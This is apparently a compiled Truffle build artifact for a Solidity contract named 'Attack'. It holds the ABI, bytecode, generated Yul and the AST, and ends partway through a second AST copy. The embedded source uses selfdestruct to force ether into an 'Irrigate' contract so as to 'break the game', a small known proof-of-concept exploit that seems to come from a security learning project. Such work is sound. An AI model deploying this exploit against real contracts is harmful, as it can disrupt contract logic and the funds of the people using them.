{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Irrigate",
          "name": "_irrigate",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.8.4+commit.c7e474f2\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract Irrigate\",\"name\":\"_irrigate\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Attack.sol\":\"Attack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Attack.sol\":{\"keccak256\":\"0xcb8fcb138e6a62336a6189f6c8bebe8bd3444310a1a9d3e707ddb79661c319f2\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://d8f123871b129a0d38c9123376fcbfeb09319fce626f4977d512b8d01915711b\",\"dweb:/ipfs/QmTUp87q8VFcziCw69zUL5dVq41mhdT45QzqxRizZtGFLC\"]},\"/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Context.sol\":{\"keccak256\":\"0xf7eb3ef48cd94c66f26955db025486d701d6e061bdae6684346c81027112a2b9\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://7388e372b392d7334f6fc6683e99b51497a5649197b7e1e57875e9314d512bc6\",\"dweb:/ipfs/QmW1QkpHqx8UkAG1Ss97sMGURXsfFvsXbwbPVdjQpzjdSR\"]},\"/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Dai.sol\":{\"keccak256\":\"0xe77b36fb20a4ebe20d625b442246166b0b43e58cee39ee04b5db11fbc093cf0d\",\"license\":\"AGPL-3.0-or-later\",\"urls\":[\"bzz-raw://734bf9ef30ba9e429f91fa47e86f55254ffcf9cf0c66f17123743df41e8dd6f0\",\"dweb:/ipfs/QmYN4M9csG97N8PZbtZLs4Yi7zgnbgZsNe8gqQB9ABiUYN\"]},\"/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Irrigate.sol\":{\"keccak256\":\"0x2d2f8ab45d74046f3a4d6aa391df4777805d6cfc28f6ff417e4a87d0f447e6aa\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://826925dd7670dd8fa64aee3a22bd2a9cba0880e94d8bab219504f3d1b8bf1672\",\"dweb:/ipfs/QmZCnpL5NJGwqbK8hTuuLNKcWiRhBxUXJsF7siP8uToRBS\"]},\"/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Ownable.sol\":{\"keccak256\":\"0x5433cd4a44a451ff09b5350edcb7de48f618fe43246901cd063f168ce8fb37c4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://40f3b1aa5d491671ce2ebf3f4ea757ea17a5fe1c19f782c20c3f58c69db896dd\",\"dweb:/ipfs/QmdYUmWXmAgzC4PFd9mYzW19xCh6cAyFiyeBB1Xrae7Gwr\"]},\"/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Pausable.sol\":{\"keccak256\":\"0x09b236f7d20c536dbc7bf4813d5dacd5899c01a91f0c92c86a7ad129d6d466ac\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8ccd091f3d804bfa5b8e8d4bc86de88030b909c69114145dd9db74af598e8bb3\",\"dweb:/ipfs/QmZFJ9gGkwy7ZxzkPNvJLtsaZASmUF7sWiaWnPuKAVoeCQ\"]},\"/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/ReentrancyGuard.sol\":{\"keccak256\":\"0x78662ecb85886ecfb03f1da4c6919a69fbeaf4ccec0193ab70e51f232e81b8ca\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://376df765cf5772dd15b4377adcd64e32a44edfb1a705891a39af20f03812bf86\",\"dweb:/ipfs/QmZy7ptKYedQRngkNM9vQgJbh2rXfGjLd8TcTVgP7aEjis\"]}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506040516101bd3803806101bd8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610111565b600081519050610087816100fa565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100da565b9050919050565b60006100d3826100b6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610103816100c8565b811461010e57600080fd5b50565b609e8061011f6000396000f3fe608060405260043610601c5760003560e01c80639e5faafc146021575b600080fd5b60276029565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220f8a9f504d19ccaa28e789f2ca50f4c0ef2d34a0b38b5ea39e89ddbb63e307b8264736f6c63430008040033",
  "deployedBytecode": "0x608060405260043610601c5760003560e01c80639e5faafc146021575b600080fd5b60276029565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220f8a9f504d19ccaa28e789f2ca50f4c0ef2d34a0b38b5ea39e89ddbb63e307b8264736f6c63430008040033",
  "immutableReferences": {},
  "generatedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:1035:7",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "86:96:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "96:22:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "111:6:7"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "105:5:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "105:13:7"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "96:5:7"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "170:5:7"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_contract$_Irrigate_$870",
                      "nodeType": "YulIdentifier",
                      "src": "127:42:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "127:49:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "127:49:7"
                }
              ]
            },
            "name": "abi_decode_t_contract$_Irrigate_$870_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "64:6:7",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "72:3:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "80:5:7",
                "type": ""
              }
            ],
            "src": "7:175:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "281:223:7",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "327:16:7",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "336:1:7",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "339:1:7",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "329:6:7"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "329:12:7"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "329:12:7"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "302:7:7"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "311:9:7"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "298:3:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "298:23:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "323:2:7",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "294:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "294:32:7"
                  },
                  "nodeType": "YulIf",
                  "src": "291:2:7"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "353:144:7",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "368:15:7",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "382:1:7",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "372:6:7",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "397:90:7",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "459:9:7"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "470:6:7"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "455:3:7"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "455:22:7"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "479:7:7"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_contract$_Irrigate_$870_fromMemory",
                          "nodeType": "YulIdentifier",
                          "src": "407:47:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "407:80:7"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "397:6:7"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_contract$_Irrigate_$870_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "251:9:7",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "262:7:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "274:6:7",
                "type": ""
              }
            ],
            "src": "188:316:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "563:51:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "573:35:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "602:5:7"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "584:17:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "584:24:7"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "573:7:7"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_address_payable",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "545:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "555:7:7",
                "type": ""
              }
            ],
            "src": "510:104:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "681:59:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "691:43:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "728:5:7"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_address_payable",
                      "nodeType": "YulIdentifier",
                      "src": "702:25:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "702:32:7"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "691:7:7"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_contract$_Irrigate_$870",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "663:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "673:7:7",
                "type": ""
              }
            ],
            "src": "620:120:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "791:81:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "801:65:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "816:5:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "823:42:7",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "812:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "812:54:7"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "801:7:7"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "773:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "783:7:7",
                "type": ""
              }
            ],
            "src": "746:126:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "937:95:7",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "1010:16:7",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "1019:1:7",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "1022:1:7",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "1012:6:7"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "1012:12:7"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "1012:12:7"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "960:5:7"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "1001:5:7"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_contract$_Irrigate_$870",
                              "nodeType": "YulIdentifier",
                              "src": "967:33:7"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "967:40:7"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "957:2:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "957:51:7"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "950:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "950:59:7"
                  },
                  "nodeType": "YulIf",
                  "src": "947:2:7"
                }
              ]
            },
            "name": "validator_revert_t_contract$_Irrigate_$870",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "930:5:7",
                "type": ""
              }
            ],
            "src": "878:154:7"
          }
        ]
      },
      "contents": "{\n\n    function abi_decode_t_contract$_Irrigate_$870_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_contract$_Irrigate_$870(value)\n    }\n\n    function abi_decode_tuple_t_contract$_Irrigate_$870_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_contract$_Irrigate_$870_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address_payable(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_contract$_Irrigate_$870(value) -> cleaned {\n        cleaned := cleanup_t_address_payable(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_contract$_Irrigate_$870(value) {\n        if iszero(eq(value, cleanup_t_contract$_Irrigate_$870(value))) { revert(0, 0) }\n    }\n\n}\n",
      "id": 7,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "deployedGeneratedSources": [],
  "sourceMap": "88:416:0:-:0;;;137:81;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;200:9;180:8;;:30;;;;;;;;;;;;;;;;;;137:81;88:416;;7:175:7;80:5;111:6;105:13;96:22;;127:49;170:5;127:49;:::i;:::-;86:96;;;;:::o;188:316::-;274:6;323:2;311:9;302:7;298:23;294:32;291:2;;;339:1;336;329:12;291:2;382:1;407:80;479:7;470:6;459:9;455:22;407:80;:::i;:::-;397:90;;353:144;281:223;;;;:::o;510:104::-;555:7;584:24;602:5;584:24;:::i;:::-;573:35;;563:51;;;:::o;620:120::-;673:7;702:32;728:5;702:32;:::i;:::-;691:43;;681:59;;;:::o;746:126::-;783:7;823:42;816:5;812:54;801:65;;791:81;;;:::o;878:154::-;967:40;1001:5;967:40;:::i;:::-;960:5;957:51;947:2;;1022:1;1019;1012:12;947:2;937:95;:::o;88:416:0:-;;;;;;;",
  "deployedSourceMap": "88:416:0:-:0;;;;;;;;;;;;;;;;;;;;;226:275;;;:::i;:::-;;;415:20;454:8;;;;;;;;;;;415:49;;488:4;475:18;;",
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\nimport \"./Irrigate.sol\";\r\n\r\ncontract Attack {\r\n    Irrigate irrigate;\r\n\r\n    constructor(Irrigate _irrigate) {\r\n        irrigate = Irrigate(_irrigate);\r\n    }\r\n\r\n    function attack() public payable {\r\n        // You can simply break the game by sending ether so that\r\n        // the game balance >= 7 ether\r\n\r\n        // cast address to payable\r\n        address payable addr = payable(address(irrigate));\r\n        selfdestruct(addr);\r\n    }\r\n}",
  "sourcePath": "C:/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Attack.sol",
  "ast": {
    "absolutePath": "/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Attack.sol",
    "exportedSymbols": {
      "Attack": [
        37
      ],
      "Context": [
        60
      ],
      "Dai": [
        670
      ],
      "Irrigate": [
        870
      ],
      "Ownable": [
        980
      ],
      "Pausable": [
        1072
      ],
      "ReentrancyGuard": [
        1112
      ]
    },
    "id": 38,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".4"
        ],
        "nodeType": "PragmaDirective",
        "src": "33:23:0"
      },
      {
        "absolutePath": "/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Irrigate.sol",
        "file": "./Irrigate.sol",
        "id": 2,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 38,
        "sourceUnit": 871,
        "src": "60:24:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 37,
        "linearizedBaseContracts": [
          37
        ],
        "name": "Attack",
        "nameLocation": "97:6:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 5,
            "mutability": "mutable",
            "name": "irrigate",
            "nameLocation": "120:8:0",
            "nodeType": "VariableDeclaration",
            "scope": 37,
            "src": "111:17:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Irrigate_$870",
              "typeString": "contract Irrigate"
            },
            "typeName": {
              "id": 4,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 3,
                "name": "Irrigate",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 870,
                "src": "111:8:0"
              },
              "referencedDeclaration": 870,
              "src": "111:8:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Irrigate_$870",
                "typeString": "contract Irrigate"
              }
            },
            "visibility": "internal"
          },
          {
            "body": {
              "id": 17,
              "nodeType": "Block",
              "src": "169:49:0",
              "statements": [
                {
                  "expression": {
                    "id": 15,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 11,
                      "name": "irrigate",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 5,
                      "src": "180:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Irrigate_$870",
                        "typeString": "contract Irrigate"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 13,
                          "name": "_irrigate",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 8,
                          "src": "200:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Irrigate_$870",
                            "typeString": "contract Irrigate"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_contract$_Irrigate_$870",
                            "typeString": "contract Irrigate"
                          }
                        ],
                        "id": 12,
                        "name": "Irrigate",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 870,
                        "src": "191:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Irrigate_$870_$",
                          "typeString": "type(contract Irrigate)"
                        }
                      },
                      "id": 14,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "191:19:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Irrigate_$870",
                        "typeString": "contract Irrigate"
                      }
                    },
                    "src": "180:30:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Irrigate_$870",
                      "typeString": "contract Irrigate"
                    }
                  },
                  "id": 16,
                  "nodeType": "ExpressionStatement",
                  "src": "180:30:0"
                }
              ]
            },
            "id": 18,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 9,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 8,
                  "mutability": "mutable",
                  "name": "_irrigate",
                  "nameLocation": "158:9:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 18,
                  "src": "149:18:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_Irrigate_$870",
                    "typeString": "contract Irrigate"
                  },
                  "typeName": {
                    "id": 7,
                    "nodeType": "UserDefinedTypeName",
                    "pathNode": {
                      "id": 6,
                      "name": "Irrigate",
                      "nodeType": "IdentifierPath",
                      "referencedDeclaration": 870,
                      "src": "149:8:0"
                    },
                    "referencedDeclaration": 870,
                    "src": "149:8:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Irrigate_$870",
                      "typeString": "contract Irrigate"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "148:20:0"
            },
            "returnParameters": {
              "id": 10,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "169:0:0"
            },
            "scope": 37,
            "src": "137:81:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 35,
              "nodeType": "Block",
              "src": "259:242:0",
              "statements": [
                {
                  "assignments": [
                    22
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 22,
                      "mutability": "mutable",
                      "name": "addr",
                      "nameLocation": "431:4:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 35,
                      "src": "415:20:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      },
                      "typeName": {
                        "id": 21,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "415:15:0",
                        "stateMutability": "payable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 30,
                  "initialValue": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 27,
                            "name": "irrigate",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 5,
                            "src": "454:8:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Irrigate_$870",
                              "typeString": "contract Irrigate"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Irrigate_$870",
                              "typeString": "contract Irrigate"
                            }
                          ],
                          "id": 26,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "446:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 25,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "446:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 28,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "446:17:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "id": 24,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "nodeType": "ElementaryTypeNameExpression",
                      "src": "438:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_address_payable_$",
                        "typeString": "type(address payable)"
                      },
                      "typeName": {
                        "id": 23,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "438:8:0",
                        "stateMutability": "payable",
                        "typeDescriptions": {}
                      }
                    },
                    "id": 29,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "438:26:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "415:49:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 32,
                        "name": "addr",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 22,
                        "src": "488:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 31,
                      "name": "selfdestruct",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 4294967275,
                      "src": "475:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
                        "typeString": "function (address payable)"
                      }
                    },
                    "id": 33,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "475:18:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 34,
                  "nodeType": "ExpressionStatement",
                  "src": "475:18:0"
                }
              ]
            },
            "functionSelector": "9e5faafc",
            "id": 36,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nameLocation": "235:6:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 19,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "241:2:0"
            },
            "returnParameters": {
              "id": 20,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "259:0:0"
            },
            "scope": 37,
            "src": "226:275:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          }
        ],
        "scope": 38,
        "src": "88:416:0",
        "usedErrors": []
      }
    ],
    "src": "33:471:0"
  },
  "legacyAST": {
    "absolutePath": "/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Attack.sol",
    "exportedSymbols": {
      "Attack": [
        37
      ],
      "Context": [
        60
      ],
      "Dai": [
        670
      ],
      "Irrigate": [
        870
      ],
      "Ownable": [
        980
      ],
      "Pausable": [
        1072
      ],
